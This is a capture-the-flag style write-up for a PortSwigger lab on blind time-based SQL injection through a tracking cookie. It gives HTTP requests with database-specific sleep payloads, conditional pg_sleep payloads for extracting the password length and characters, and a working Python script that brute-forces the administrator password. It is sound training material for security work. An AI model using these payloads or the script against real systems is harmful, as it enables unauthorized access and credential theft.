# Lab 12: Blind SQL injection with time delays and information retrieval

## Description

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Solution

The objective of this lab is to exploit the SQL-injectable tracking cookie to reveal the password of the `administrator` user, which is stored in the `password` column of the `users` table on the row with the value `administrator` for the `username` column. The application provides no real feedback based on the outcome of the SQL query, but since it executes the SQL query synchronously before returning the HTTP response, we can ask it questions and leverage time delays to interpret its answers.

### Modeling the injectable SQL query and backend code

We first identify the vulnerable tracking cookie as `TrackingId`. Since the application provides no real feedback based on the outcome of the SQL query's execution, there's no real way to validate whether the cookie is truly vulnerable except for guessing the structure of the SQL query and attempting to inject a time delay.

We'll start with the former. The structure of the SQL query probably looks like:

```sql
SELECT TrackingId FROM TrackingIds WHERE TrackingId = '$TRACKING_ID'
```

Based on the behavior of the application, the backend server code probably looks like:

```python
tracking_id = request.cookies['TrackingId']
sql_query = f"SELECT TrackingId FROM TrackingIds WHERE TrackingId = '{tracking_id}'"
try:
	rows = db.execute(sql_query)  # SQL query is executed synchronously
except SQLError:
	pass  # SQL error is caught and ignored
if len(rows) > 0:
	do_some_asynchronous_tracking(rows[0].TrackingId)
render("Page")  # Page renders regardless of outcome of SQL query
```

Now we want to inject a time delay into the query to validate the presence of the SQL injection vulnerability. Time delay syntax varies between database types and due to the lack of feedback, we don't yet have any way to know what type of database the web application is using. Thus, we will test several different time delay commands before we can get one to work.

### Testing time-delay injections

#### Oracle

```http
GET /filter?category=Lifestyle HTTP/1.1
Host: ac161fef1ea69b55804f03aa00820025.web-security-academy.net
Cookie: TrackingId=Vi4dPSiPRAt7q0lL'%3b dbms_pipe.receive_message(('a'),10)--; session=slttJiHdGhUsemHOywMi4HKTZC2ZtHmU
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

No delay.

#### Microsoft SQL

```http
GET /filter?category=Lifestyle HTTP/1.1
Host: ac161fef1ea69b55804f03aa00820025.web-security-academy.net
Cookie: TrackingId=Vi4dPSiPRAt7q0lL'%3b WAITFOR DELAY '0:0:10'--; session=slttJiHdGhUsemHOywMi4HKTZC2ZtHmU
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

No delay.

#### PostgreSQL

```http
GET /filter?category=Lifestyle HTTP/1.1
Host: ac161fef1ea69b55804f03aa00820025.web-security-academy.net
Cookie: TrackingId=Vi4dPSiPRAt7q0lL'%3b SELECT pg_sleep(10)--; session=slttJiHdGhUsemHOywMi4HKTZC2ZtHmU
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

Success! Consistent 10 second delay.

This gives us two pieces of valuable information:
1. The database is PostgreSQL
2. We can execute stacked queries

Next we'll test a conditional time delay injection to make sure we can ask the database questions and interpret its responses based on time delay.

### Testing conditional time delays

We'll test an always-true injection to ensure that when the condition is true, the database waits 10 seconds.

```http
GET /filter?category=Lifestyle HTTP/1.1
Host: ac161fef1ea69b55804f03aa00820025.web-security-academy.net
Cookie: TrackingId=Vi4dPSiPRAt7q0lL'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--; session=slttJiHdGhUsemHOywMi4HKTZC2ZtHmU
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

Success! We'll test an always-false injection to ensure that when the condition is false, the database waits 10 seconds.

```http
GET /filter?category=Lifestyle HTTP/1.1
Host: ac161fef1ea69b55804f03aa00820025.web-security-academy.net
Cookie: TrackingId=Vi4dPSiPRAt7q0lL'%3b SELECT CASE WHEN (1=2) THEN pg_sleep(0) ELSE pg_sleep(10) END--; session=slttJiHdGhUsemHOywMi4HKTZC2ZtHmU
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

Success again! Now we're confident that we can ask the database questions and reliably interpret its answers.

```sql
SELECT TrackingId FROM TrackingIds WHERE TrackingId = 'Vi4dPSiPRAt7q0lL' AND SELECT CASE WHEN (table_name = 'users') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM information_schema.tables WHERE table_name = 'users'--'
```

### Figuring out the password length

We know the target table is named `users` and that the columns are `username` and `password`. Before we begin brute-forcing `administrator`'s password, it would be wise to first determine the length of the password. We imagine the password is between 0 and 100 characters long, so we start by determining whether the password is in the first half of that range or the second.

```txt
Vi4dPSiPRAt7q0lL'%3b SELECT CASE WHEN (LENGTH(password) < 50) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--
```

The web application response delay of approximately 10 seconds indicates that the password is less than 50 characters long. Now we repeat the same process to check and see if the password is shorter than or longer than 25 characters and so on until we settle on the password length of 20 characters.

```txt
Vi4dPSiPRAt7q0lL'%3b SELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--
```

Now we can inject the following to brute force `administrator`'s password:

```txt
Vi4dPSiPRAt7q0lL'%3b SELECT CASE WHEN (SUBSTRING(password, $INDEX, 1) = '$CHARACTER') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--
```

We can automate this process.

```python
import datetime
import string
import requests

delay = 5  # seconds
password_length = 20
with open("password.txt", "a") as f:
    for i in range(1, password_length + 1):
        for c in string.ascii_letters + string.digits:
            before = datetime.datetime.now()
            response = requests.get(
                "https://ac161fef1ea69b55804f03aa00820025.web-security-academy.net",
                cookies={
                    "TrackingId": f"Vi4dPSiPRAt7q0lL'%3b SELECT CASE WHEN (SUBSTRING(password, {i}, 1) = '{c}') THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--",
                    "session": "slttJiHdGhUsemHOywMi4HKTZC2ZtHmU"
                }
            )
            after = datetime.datetime.now()
            delta = after - before
            if delta.seconds >= float(delay):
                f.write(c)
                f.flush()
                break
            print("", end="\r")
            print(f"[*] Progress: character index {i}, character {c}, delta: {delta}", end="\r")
    f.write("\n")
```

We find that `administrator`'s password is `3eyviuxpffvomipeggak` and successfully login.